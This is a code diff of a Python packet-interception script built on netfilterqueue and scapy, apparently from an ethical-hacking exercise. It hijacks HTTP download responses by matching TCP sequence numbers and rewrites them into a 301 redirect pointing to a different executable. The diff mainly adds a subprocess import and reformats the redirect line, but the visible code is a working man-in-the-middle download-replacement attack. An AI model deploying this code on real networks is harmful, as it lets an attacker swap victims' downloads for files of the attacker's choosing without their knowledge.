@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import netfilterqueue
 import scapy.all as scapy
+import subprocess
 
 
 ack_list = []
@@ -26,12 +27,14 @@ def process_packet(packet):
                 if scapy_packet[scapy.TCP].seq in ack_list:
                     ack_list.remove(scapy_packet[scapy.TCP].seq)
                     print("[+] Replacing File")
-                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z2107-x64.exe\n")
+                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
+                                                             "https://www.7-zip.org/a/7z2107-x64.exe\n")
                     packet.set_payload(bytes(modified_packet))
 
         packet.accept()
     except IndexError:
         print(' Skipping TCP Layer Error')
+
 
 try:
     queue = netfilterqueue.NetfilterQueue()
